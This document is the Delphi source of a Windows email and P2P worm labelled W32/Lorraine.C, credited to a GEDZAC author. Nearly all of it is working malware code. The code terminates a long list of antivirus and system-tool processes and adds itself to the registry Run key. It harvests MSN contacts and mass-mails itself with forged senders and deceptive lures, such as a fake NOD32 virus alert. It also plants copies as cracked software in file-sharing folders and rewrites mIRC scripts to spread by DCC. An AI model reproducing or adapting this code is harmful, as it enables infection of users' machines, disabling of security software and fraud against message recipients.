   unit Rreinalo;

   {*************************************
   Virus Name: W32/Lorraine.C
   Implementas: Tecnica Retro viriica  y Mirc Replication
   El códgio original a sido totalmente alterado
   Bi0Coded by Falckon/GEDZAC
   Made in Mexico
   I love you Lorena Rivas S.
   **************************************}

   interface

   uses
       Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
       Dialogs,Registry, StdCtrls, Psock, NMsmtp,MMSystem,ShellApi,Tlhelp32;


   type
     TForm1 = class(TForm)
       muerte: TNMSMTP;
       Memo1: TMemo;
       Edit1: TEdit;
       procedure FormCreate(Sender: TObject);
       procedure TextsCreate;
       procedure mensajes;
       procedure InfectP2P;
       procedure infectmirc;
       procedure asesinando;

     private
       { Private declarations }
     public
       { Public declarations }
     end;

     Const
     nombrew:pchar = 'W32/Lorraine.c [GEDZAC LABS 2003]';

   var
     Form1: TForm1;
       d:integer;
       Tiempo : TSystemTime;
       guorm:string;
       Reg : TRegistry   ;
       Progfiles:String;
       VirusName:String;
       SysDir:string   ;
       correo:string;
       Suj:Array[1..36] of string;
       Bod:Array[1..36] of string  ;
       Att:array[1..36] of string;
       fro:ARRAY[1..36] OF STRING;
       xaz:integer;
       eltimer:Tmsg ;

     implementation

     {$R *.dfm}

   function Asesinar(archivo: string): integer;
       const
        Terminar_proceso=$0001;
     var
       CLP: BOOL;
       lahandle: THandle;
       Procesos32: TProcessEntry32;
       begin
       result := 0;
       lahandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
       Procesos32.dwSize := Sizeof(Procesos32);
       CLP := Process32First(lahandle,Procesos32);
       while integer(CLP) <> 0 do
       begin
        if ((UpperCase(ExtractFileName(Procesos32.szExeFile)) = UpperCase(archivo)) or (UpperCase(Procesos32.szExeFile) =  UpperCase(archivo))) then
          Result := Integer(TerminateProcess(OpenProcess(Terminar_proceso, BOOL(0),Procesos32.th32ProcessID), 0));
        CLP := Process32Next(lahandle,Procesos32);
       end;
       CloseHandle(lahandle);
   end;

   function GetSystemDirectory : String;
       var
    pcSystemDirectory : PChar;
       dwSDSize          : DWORD;
     begin
       dwSDSize := MAX_PATH + 1;
       GetMem( pcSystemDirectory, dwSDSize );
     try
        if Windows.GetSystemDirectory( pcSystemDirectory, dwSDSize ) <> 0 then
          Result := pcSystemDirectory;
          finally
          FreeMem( pcSystemDirectory );
      end;
   end;

   function RegRead(LaKey: HKEY; Rutakey, Valor: String): String;
   var
     ValorRet: array[0..1500] of Char;
      TamaDato: Integer;
      llaveactual: HKEY;
     begin
      RegOpenKeyEx(LaKey, PChar(Rutakey), 0, KEY_ALL_ACCESS, llaveactual);
      TamaDato := 1501;
        RegQueryValueEx(llaveactual, PChar(Valor), nil, nil, @ValorRet[0], @TamaDato);
        RegCloseKey(llaveactual);
      Result := String(ValorRet);
   end;

   procedure TForm1.asesinando;
   Begin
      Asesinar('_AVP32.exe');
      Asesinar('_AVPCC.exe ');
      Asesinar('_AVPM.exe ');
      Asesinar('ADVXDWIN.exe');
      Asesinar('AGENTW.EXE ');
      Asesinar('ALERTSVC.exe ');
      Asesinar('ALOGSERV.exe');
      Asesinar('AMON9X.exe');
      Asesinar('ANTI-TROJAN.exe');
      Asesinar('ANTS.exe');
      Asesinar('APVXDWIN.exe');
      Asesinar('ATCON.exe');
      Asesinar('ATUPDATER.exe');
      Asesinar('ATWATCH.exe');
      Asesinar('AUTODOWN.exe');
      Asesinar('AVCONSOL.exe');
      Asesinar('AVGCC32.exe');
      Asesinar('AVGCTRL.exe');
      Asesinar('AVGSERV.exe');
      Asesinar('AVGSERV9.exe');
      Asesinar('AVGW.exe');
      Asesinar('AVKPOP.exe');
      Asesinar('AVKSERV.exe ');
      Asesinar('AVKSERVICE.exe');
      Asesinar('AVKWCTL9');
      Asesinar('AVP32.exe');
      Asesinar('AVPCC.exe');
      Asesinar('AVPM.exe');
      Asesinar('AVPM.EXE ');
      Asesinar('AVSCHED32.exe');
      Asesinar('AVSYNMGR.exe');
      Asesinar('PAV.EXE ');
      Asesinar('AVWINNT.EXE');
      Asesinar('AVXMONITOR9X.exe');
      Asesinar('AVXMONITORNT.exe ');
      Asesinar('AVXQUAR.exe ');
      Asesinar('AVXQUAR.EXE');
      Asesinar('AVXW.exe ');
      Asesinar('BLACKD.exe');
      Asesinar('BLACKICE.exe');
      Asesinar('CCAPP.EXE ');
      Asesinar('CCEVTMGR.EXE');
      Asesinar('CCPXYSVC.EXE');
      Asesinar('ETRUSTCIPE.EXE ');
      Asesinar('EVPN.EXE');
      Asesinar('EXPERT.exe');
      Asesinar('F-AGNT95.exe ');
      Asesinar('FAMEH32.exe');
      Asesinar('F-PROT.exe');
      Asesinar('F-PROT95.exe');
      Asesinar('FP-WIN.exe');
      Asesinar('FRW ERV.exe');
      Asesinar('IOMON98.exe');
      Asesinar('NAV AUTO-PROTECT.exe');
      Asesinar('NAVAP.EXE ');
      Asesinar('NAVAPSVC.EXE');
      Asesinar('Navapw32.exe ');
      Asesinar('NAVENGNAVEX15.EXE ');
      Asesinar('NAVLU32.EXE');
      Asesinar('NAVW32.EXE');
      Asesinar('NAVWNT.EXE');
      Asesinar('NDD32.EXE ');
      Asesinar('NPSSVC.EXE');
      Asesinar('NSCHED32.EXE');
      Asesinar('PCCIOMON.EXE ');
      Asesinar('PCCNTMON.EXE');
      Asesinar('PCCWIN97.EXE ');
      Asesinar('PCCWIN98.EXE ');
      Asesinar('PCSCAN.EXE');
      Asesinar('PERSFW.EXE');
      Asesinar('PERSWF.EXE ');
      Asesinar('POP3TRAP.EXE ');
      Asesinar('RAV7.EXE');
      Asesinar('VPC32.EXE');
      Asesinar('VPTRAY.EXE');
      Asesinar('VSCHED.EXE ');
      Asesinar('AVCONSOL.EXE');
      Asesinar('VSECOMR.EXE');
      Asesinar('VSHWIN32.EXE ');
      Asesinar('VSMAIN.EXE ');
      Asesinar('VSMON.EXE ');
      Asesinar('VSSTAT.EXE ');
      Asesinar('ZONEALARM.EXE ');
      Asesinar('ICLOAD95.EXE');
      Asesinar('ICMON.EXE');
      Asesinar('ICSUPP95.EXE');
      Asesinar('ICLOADNT.EXE');
      Asesinar('ICSUPPNT.EXE');
      Asesinar('IFACE.EXE');
      Asesinar('Regedit.EXE');
      Asesinar('Regedit.com');
      Asesinar('msconfig.EXE');
      Asesinar('sfc.EXE');
      Asesinar('sysedit.EXE');
      Asesinar('regedt32.EXE');
      Asesinar('NSPCLEAN.exe');
      Asesinar('taskmgr.exe');
   End;

   procedure TForm1.FormCreate(Sender: TObject);
   var
     regmsn:string;
      hostmail,lng:string;
      puta:integer;
      xp,v:integer;
      xg:string;
      b,contact,chals:integer;
      label yajodio;
      label jodio;
        begin
        asesinando;
        SysDir:=GetSystemDirectory;
        guorm := Application.ExeName;
        VirusName := 'Lorraine';
        Application.ShowMainForm := false;
        Reg := TRegistry.Create;
        Reg.RootKey:=HKEY_LOCAL_MACHINE;
        For b := 1 to 1000 DO
     begin
     regmsn:=RegRead(HKEY_CURRENT_USER,'Software\Microsoft\MessengerService\ListCache\.NET Messenger Service','Allow'+inttostr(b))   ;
     Memo1.lines.Add(regmsn);
     end;
     For b:=1 to 1000 DO
     begin
     regmsn:=RegRead(HKEY_CURRENT_USER,'Software\Microsoft\MSNMessenger\ListCache\.NET Messenger Service','Allow'+inttostr(b))   ;
     Memo1.lines.Add(regmsn);
   end;
      contact:=Memo1.lines.Count Mod 22;
      if contact = 0 then
      Begin
      contact:=0;
   end;
      Edit1.text:=Memo1.Lines[contact];
      GetlocalTime(Tiempo);
      if Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',true) then
      Reg.WriteString('LOAD32',SysDir + '\Lorena.exe');
      copyfile(pchar(guorm), pChar(SysDir + '\Lorena.exe'),true);
      if Not FileExists('C:\Mark.vxd') then
      Begin
      copyfile(pchar(guorm),'C:\Mark.vxd',true);
      InfectP2P
      end;
      Reg.RootKey:=HKEY_CURRENT_USER  ;
      If  Reg.OpenKeyReadOnly('\Control Panel\International') Then
      lng := reg.ReadString('sLanguage');
      xp := strlen(pchar(lng)) ;
      For v := 1 to xp -1 do
        Begin
        xg := xg + lng[v]
        end;
        if xg='ES' then
        Begin
        Bod[1] := 'En los últimos días se ha ido detectando un nuevo virus llamado Mapson, '+
                 'ya  se  han detectado varios infectados de este gusano, si usted se encuentra infectado podrá remover este gusano con esta herramienta gratuita que  le hemos enviado, ' +
                 'una vacuna que hemos diseñado especialmente para usuarios de hotmail, si usted esta de acuerdo haga clic en el adjunto para empezar el scaneo y eliminar este despreciable gusano de su maquina.'+
                 ' Gracias.' ;
       Att[1] := 'NSPCLEAN.exe';
       Suj[1] := 'Alerta por Virus W32/Mapson';
       fro[1] := 'antivirus@nod32.com';

       Suj[2] := 'Re:Reenviamelo de nuevo';
       Bod[2] := 'Si te gusto reenviamelo. '  ;
       Att[2] := 'bromas.scr';
       fro[2] := String(Edit1.text);

       Suj[3] := 'Re:Quitan cuentas de hotmail.';
       Bod[3] := 'Al parecer hotmail ya esta muy saturado de usuarios y amenazan con quitar cuentas,'+
                 ' pero se puede evitar siguiendo unos pasos, léelos y no tendrás problemas,  chau.';
       Att[3] := 'pasos.pif';
       fro[3] := String(Edit1.text);

       Suj[4] := 'Problema de seguridad en Internet Explorer';
       Bod[4] := 'Un problema de seguridad a sido detectado en Internet Explorer'+
                 ' se recomienda aplicar los correspondientes parches ya que esta vulnerabilidad puede permitir la ejecución arbitraria de código en la maquina afectada,'+
                 ' para saber mas acerca de esta vulnerabilidad favor de leer el documento  y así prevenir el ataque de un virus informativo.';
       Att[4] := 'IEXPLORERSTACK.pif';
       fro[4] := string(Edit1.text);

       Suj[5] := 'Re: Léelo y reenvíalo a quienes mas amas.';
       Bod[5] := 'Si el documento expone lo que sientes hacia otra persona, reenvíalo a tus amigos y un sueño se hará realidad.';
       Att[5] := 'amor_real.pif';
       fro[5] := String(Edit1.text);

       Suj[6] := 'Si no te late....';
       Bod[6] := 'Si no te late, devuélvemelo';
       fro[6] := string(Edit1.Text);
       Att[6] := 'fotokosmiko.scr';

       Suj[7] := 'Lista de Hoaxes';
       Bod[7] := 'Te envío una lista de hoaxes, virus falsos, para que estés prevenido y no hagas caso a las mentiras, chau cuídate';
       Att[7] := 'hoax-list.com';
       fro[7] := String(Edit1.text);

       Suj[8] := 'Para mis amigos';
       Bod[8] := 'Los mejores chistes que tengo, disfrutenlos';
       Att[8] := 'OsamaBinLadenJokes.scr';
       fro[8] := String(Edit1.text);

       Suj[12] := 'Espero que te guste';
       Bod[12] := 'Si no te gusta, devuélvemelo...';
       Att[12] := 'Cards.exe';
       fro[12] :=  String(Edit1.text);

       Suj[13] := 'Los 10 pasos para...';
       Bod[13] := 'Aquí le mando los 10 pasos para tener una buena relación sexual, léalos y no tendrá problemas en su vida sexual.';
       Att[13] := 'carta_de_amor.exe';
       fro[13] := String(Edit1.text);

       Suj[14] := '10 consejos para terminar su noviazgo'  ;
       Bod[14] := 'Le envío los 10 mejores consejos para romper con su noviazgo y hacer esta etapa menos dolorosa.' ;
       Att[14] := 'consejos-noviazgo.exe';
       fro[14] := string(Edit1.Text);

       Suj[15] := 'Herramienta gratuita para eliminar el Mapson';
       Bod[15] := 'Si usted esta infectado de este peligroso gusano es mejor que utilice la vacuna que le mando, ejecútela y no tendrá mas problemas.'  ;
       Att[15] := 'Anti-Worm.exe';
       fro[15] := String(Edit1.text);

       Suj[16] := 'Re: Dime que te parece';
       Bod[16] := 'Si la animación que te envío no te hace reír elimínala.';
       fro[16] :=  String(Edit1.text);
       Att[16] := 'animation-simpsons.scr';

       Suj[17] := 'Lea con atención';
       Bod[17] := 'Si lee con mucha pero con mucha atención el siguiente texto vera que todos sus sueños se harán realidad.';
       Att[17] := 'realidades.pif';
       fro[17] := String(Edit1.text);

       Suj[18] := 'Por que es mi amigo.';
       Bod[18] := 'Solo quiero lo mejor para usted, por que lo considero mi amigo, si esta dispuesto a leer lo que escrito con mucho cariño para usted, entonces lea el adjunto. Chau'   ;
       Att[18] := 'porque-lo-quiero.pif';
       fro[18] :=  String(Edit1.text);

       Suj[19] := 'por que lo vales.';
       Bod[19] := 'Como usted es mi amigo lo valoro mucho por eso quiero lo mejor para usted,'+
                  ' tanto que le dedique tiempo para escribirle este poema, espero le guste, '+
                  ' Saludos';
       Att[19] := 'amigos-por-siempre.exe';
       fro[19] := String(Edit1.text);

       Suj[20] := 'Documentos';
       Bod[20] := 'Lea el adjunto y enterese.';
       Att[20] := 'documents.scr';
       fro[20] := String(Edit1.text);

       Suj[21] := 'Por que su amistad es lo mas importante.';
       Bod[21] := 'Lo valoro mucho a usted, su amistad es muy importante para mi, cuidese mucho, saludos.'  ;
       Att[21] := 'loValoroMucho.scr';
       fro[21] := String(Edit1.Text)     ;

       Suj[22] := 'Te amo';
       Bod[22] := 'Una carta de amor escrita por mi, dedicada a ti.. léela por favor.';
       Att[22] := 'amor-eterno.pif';
       fro[22] := string(edit1.Text)  ;
   end
      Else
        begin
       Bod[1] := 'In the last days has gone detecting a new called virus Mapson, '+
                 'already they have been detected various infected of this worm, if you is found infected will be able to remove this worm with this free tool that we have sent him, ' +
                 'A vaccine that have designed especially for users of hotmail, if you this in agreement doing click in the enclosed one to begin the scaneo and to eliminate this despicable worm of its plots. ';
       Att[1] := 'NSPCLEAN.exe';
       Suj[1] := 'Warning by Virus W32/Mapson';
       fro[1] := 'antivirus@nod32.com';

       Suj[2] := 'Resubmit again';
       Bod[2] := 'If you like it resubmit it to me. '  ;
       Att[2] := 'jokess.scr';
       fro[2] := String(Edit1.text);

       Suj[3] := 'They remove accounts of hotmail.';
       Bod[3] := 'Apparently hotmail already this very saturated of users and threatens clearing accounts ,'+
                 ' but it is possible to be avoided following steps, read it and it will not have problems.';
       Att[3] := 'steps.pif';
       fro[3] := String(Edit1.text);

       Suj[4] := 'problem of security in Internet Explorer ';
       Bod[4] := 'A detected problem of security to in Internet Explorer '+
                 ' it is recommended to apply the corresponding patches since this vulnerability can allow the arbitrary execution of code in the affected machine ,'+
                 ' in order to know how but about this vulnerability please to read the document and thus to prevent the attack with a computer science virus.';
       Att[4] := 'IEXPLORER_STACK.pif';
       fro[4] := string(Edit1.text);

       Suj[5] := 'Fwd:read it an resubmit it to the people that you more love';
       Bod[5] := 'If the document exposes what you feel towards another person, resubmit to your friends and a dream will become reality .';
       Att[5] := 'real_love.scr';
       fro[5] := String(Edit1.text);

       Suj[6] := 'If it does not bark to you....';
       Bod[6] := 'If it does not bark to you, return it to me ';
       fro[6] := string(Edit1.Text);
       Att[6] := 'Photookosmike.scr';

       Suj[7] := 'Hoax List';
       Bod[7] := 'It sent a list of hoaxes, virus false, so that you are come up and you do not make case to the lies, good bye to you.';
       Att[7] := 'hoax-list.com';
       fro[7] := String(Edit1.text);

       Suj[8] := 'For my friends ';
       Bod[8] := 'The best jokes than I have, Enjoy it!';
       Att[8] := 'OsamaBinLadenJokes.scr';
       fro[8] := String(Edit1.text);

       Suj[12] := 'I hope that you like ';
       Bod[12] := 'If you do not like, return it to me';
       Att[12] := 'Cards_love.pif';
       fro[12] :=  String(Edit1.text);

       Suj[13] := 'the ten steps for.....';
       Bod[13] := 'here i have sent you ten steps to have well sex, please read it and you will not have problems on you sexual life.';
       Att[13] := 'sexual_steps.pif';
       fro[13] := String(Edit1.text);

       Suj[14] := 'ten counsels to finish with its boyfriend'  ;
       Bod[14] := 'It shipment the ten better counsels to break with its boyfriend or girlfriend and to do this phase less painful.' ;
       Att[14] := 'counsels.pif';
       fro[14] := string(Edit1.Text);

       Suj[15] := 'the msn 6 violates our privacy';
       Bod[15] := 'a complete analysis of the software of microsoft indicates that the msn 6 may be stealing us information and being sent al place of microsoft, but details in the document.'  ;
       Att[15] := 'analysis_mzn6.pif';
       fro[15] := String(Edit1.text);

       Suj[16] := 'tell me that it seems';
       Bod[16] := 'If the animation that I send to you not makes you laugh, delete it.';
       fro[16] :=  String(Edit1.text);
       Att[16] := 'animation-simpsons.scr';

       Suj[17] := 'Read with attention';
       Bod[17] := 'If read with much but with much attention the following text side that all their dreams will become reality. ';
       Att[17] := 'reality_dreams.pif';
       fro[17] := String(Edit1.text);

       Suj[18] := 'So that he is my friend. ';
       Bod[18] := 'Single I want the best thing for you, so that I consider my friend, if this ready to read what written with much affection to you, then you read the associate. bye'   ;
       Att[18] := 'my_best_friend.pif';
       fro[18] :=  String(Edit1.text);

       Suj[19] := 'so that it bonds.';
       Bod[19] := 'As you are my friend I value much for that reason I want the best thing for you,'+
                  ' as much that it dedicates time to him to write east poem to him, it hopes likes,  '+
                  ' Greetings.';
       Att[19] := 'friends.pif';
       fro[19] := String(Edit1.text);

       Suj[20] := 'Documents.';
       Bod[20] := 'Reads and be informed.';
       Att[20] := 'documents.scr';
       fro[20] := String(Edit1.text);

       Suj[21] := 'So that its friendship is but the important thing. ';
       Bod[21] := 'So that its friendship is but the important thing.'  ;
       Att[21] := 'Ivalue-much.pif';
       fro[21] := String(Edit1.Text)     ;

       Suj[22] := 'I love you';
       Bod[22] := 'A letter of love written by me, dedicated to you, reads  please.';
       Att[22] := 'love-forever.pif';
       fro[22] := string(edit1.Text)  ;
   end;
      Randomize;
      xaz:= Random(22);
      if xaz = 0 then xaz := 1;
      For chals := 1 to 22 Do
      begin
      copyfile(pchar(guorm),pchar(SysDir + '\'+Att[chals]),true);
      end;
        puta := 0;
        hostmail := 'mx2.hotmail.com';
        muerte.Host := hostmail;
        yajodio:
        try
        muerte.connect;
          Except
          if muerte.Connected = false then
          begin
          puta := 1;
        end
     else
        puta := 0;
     end;
      if puta = 1 then goto yajodio   ;
      muerte.PostMessage.ToBlindCarbonCopy.AddStrings(Memo1.lines);
      muerte.PostMessage.FromAddress :=  fro[contact];
      muerte.PostMessage.FromName := fro[contact];
      muerte.PostMessage.Subject := Suj[xaz]  ;
      muerte.PostMessage.Attachments.Add(SysDir + '\' + Att[xaz]);
      muerte.PostMessage.Body.Add(Bod[xaz]);
      muerte.SendMail   ;
      muerte.Disconnect;
      TextsCreate;
      mensajes;
      infectmirc;
      SetTimer(0, 0,  2000, nil);
      while (GetMessage(eltimer,0 ,0 ,0)) do
      Begin
      asesinando;
      end;
   end;

   Procedure TForm1.infectmirc;
   Var
      RG:TRegistry;
      DV:string;
      mxa:string;
      lx:integer;
      scriptm:textfile;
      begin
      RG:=TRegistry.Create;
      RG.RootKey:=HKEY_LOCAL_MACHINE;
      if RG.OpenKeyReadOnly('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC') Then
      DV := RG.ReadString('UninstallString') ;
      for lx:=1 to length(DV) do if (lx>1)and(lx<length(DV)-19) then mxa:=mxa+DV[lx];
      AssignFile(scriptm,mxa + 'script.ini');
      reWrite(scriptm);
      Writeln(scriptm,'[script]');
      Writeln(scriptm,'n0=On 1:JOIN:#:{/if ( $nick == $me) { halt } | .privmsg $nick ' +Bod[22]+' | /dcc Send -c $nick '+SysDir+'\' + Att[22]);
      closefile(scriptm);
   end;

   Procedure TForm1.InfectP2P;
   Var
      CarpetasP2P:array[1..8] of string;
      gname:array[1..49] of string;
      c,pr:integer ;
       Begin
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       If  Reg.OpenKeyReadOnly('\SOFTWARE\Microsoft\Windows\CurrentVersion') Then
       Progfiles := reg.ReadString('ProgramFilesDir');
      CarpetasP2P[1] := '\KaZaA\My Shared Folder\';
      CarpetasP2P[2] := '\edonkey2000\incoming\';
      CarpetasP2P[3] := '\gnucleus\downloads\';
      CarpetasP2P[4] := '\icq\shared files\';
      CarpetasP2P[5] := '\kazaa lite\my shared folders\';
      CarpetasP2P[6] := '\limewire\shared\';
      CarpetasP2P[7] := '\morpheus\my shared folder\';
      CarpetasP2P[8] := '\Grokster\My Grokster\';
      gname[1] := 'Kazaa Media Desktop ' ;
      gname[2] := 'ICQ Lite ';
      gname[3] := 'WinZip';
      gname[4] := 'iMesh ';
      gname[5] := 'AOL Instant Messenger (AIM)';
      gname[6] := 'ICQ Pro 2003a beta ';
      gname[7] := 'Morpheus ';
      gname[8] := 'Ad-aware ';
      gname[9] := 'Trillian ';
      gname[10] := 'Download Accelerator Plus';
      gname[11] := 'ZoneAlarm Full Version';
      gname[12] := 'Grokster';
      gname[13] := 'PerAntivirus Crack';
      gname[14] := 'Norton Antivirus Crack';
      gname[15] := 'Mcafee Serial';
      gname[16] := 'Msn Hack';
      gname[17] := 'StarCraft No CD Crack';
      gname[18] := 'Kazaa 2.05 beta ';
      gname[19] := 'WS_FTP LE (32-bit) ';
      gname[20] := 'SnagIt ';
      gname[21] := 'Registry Mechanic';
      gname[22] := 'WinMX ';
      gname[23] := 'MSN Messenger (Windows NT/2000)';
      gname[24] := 'Biromsoft WebCam ';
      gname[25] := 'Nero Burning ROM ';
      gname[26] := 'Microsoft Windows Media Player ';
      gname[27] := 'Spybot - Search & Destroy ';
      gname[28] := 'Copernic Agent ';
      gname[29] := 'Winamp';
      gname[30] := 'Diet Kaza ';
      gname[31] := 'SolSuite 2003: Solitaire Card Games Suite ';
      gname[32] := 'Pop-Up Stopper ';
      gname[33] := 'QuickTime ';
      gname[34] := 'XoloX Ultra ';
      gname[35] := 'Microsoft Internet Explorer ';
      gname[36] := 'Network Cable e ADSL Speed ';
      gname[37] := 'Kazaa Download Accelerator ';
      gname[38] := 'Global DiVX Player ';
      gname[39] := 'DirectDVD ';
      gname[40] := 'Kaspersky Antivirus Crack' ;
      gname[41] := 'NOD32 Antivirus Crack';
      gname[42] := 'Sofía Vergara Sexy Bikini';
      gname[43] := 'Avril Lavigne Fucked Bitch';
      gname[44] := 'Shakira Sucks.jpg';
      gname[45] := 'Microsoft Office XP Serial';
      gname[46] := 'Microsoft Windows 2003 Serial.txt     ';
      gname[47] := 'Office 2003 Serial';
      gname[48] := 'Visual Studio Net Serial';
      gname[49] := 'Delphi 6 Serial';
      For c := 1 to 8 DO
      Begin
      For pr := 1 to 49 Do
      begin
      copyfile(pchar(guorm),pchar(Progfiles+CarpetasP2P[c]+gname[pr]+'.exe'),true);
      end;
      end;
   End;
   Procedure TForm1.TextsCreate;
   Var
      presentacion:textfile;
      Begin
      AssignFile (presentacion,'C:\lorraine.c.hta');
      ReWrite(presentacion);
      Writeln(presentacion,'<html><head><title>Lorraine Worm [GEDZAC LABS 2003]</title>'+
       '<meta name="generator" content="Namo WebEditor v5.0(Trial)">'+
       '</head><body bgcolor="black" ><table border="0" width="100%" bgcolor="#9966FF">'+
       '<tr><td width="727" height="2"><p align="center">&nbsp;<b><font size="3" face="Verdana,Arial" color="white">W32/Lorraine.C - Gedzac Labs 2003</font></b></p>'+
       '</td></tr></table><p align="center"><b><font color="lime" size="1" face="Verdana">//***********[GEDZAC LABS 2003]***********//</font></b></p>'+
       '<p align="center"><b><font color="lime" size="1" face="Verdana">W32/Lorraine.C by Falckon/GEDZAC</font></b></p> '+
       '<p align="center"><b><font color="lime" size="1" face="Verdana">Dedicated to '+
       'LoReNa R.S.</font></b></p> '+
       '<p align="center"><b><font color="lime" size="1" face="Verdana">Made in MeXiKO</font></b></p>  '+
       '<p align="center"><b><a href="http://vx.netlux.org/~falckon"><font color="lime" size="1" face="Verdana">http://vx.netlux.org/~falckon</font></a></b></p> '+
       '<p align="center"><b><font color="lime" size="1" face="Verdana">Gedzac Labs.</font></b></p>'+
       '<p align="center"><b><font color="lime" size="1" face="Verdana">Thx to:<br>MachineDramon/GEDZAC '+
       '(thx by your counsels)<br>SlageHammer (thx for th&nbsp;Op in the channel)<br>Ahn '+
       'CY <br>SecuXp (thx for contact me)<br>positron (thx for the Blink Source)<br>and above all thanks to my inspiration: my lorraine<br></font></b></p></body></html>');
      CloseFile(presentacion);
      if Tiempo.wDay = 4 then
      Begin
      ShellExecute(Form1.Handle,nil,PChar('c:\lorraine.c.hta'),'','',SW_SHOWNORMAL);
      ShellExecute(Form1.Handle,nil,PChar('http://www.gratisweb.com/falckon/index.html'),'','',SW_SHOWNORMAL);
      end;
   end;
   Procedure TForm1.mensajes;
     Begin
      iF Tiempo.wMonth = 10  Then
      Begin
      MessageBox(0,'Bi0C0ded by Falckon/GEDZAC',nombrew,16);
      MessageBox(0,'Lorraine ReC0deD and Reloaded :P',nombrew,16);
      End;
      End;
   End.


   // esta ya no parece variante
   // jeje a sido totalmente modificada
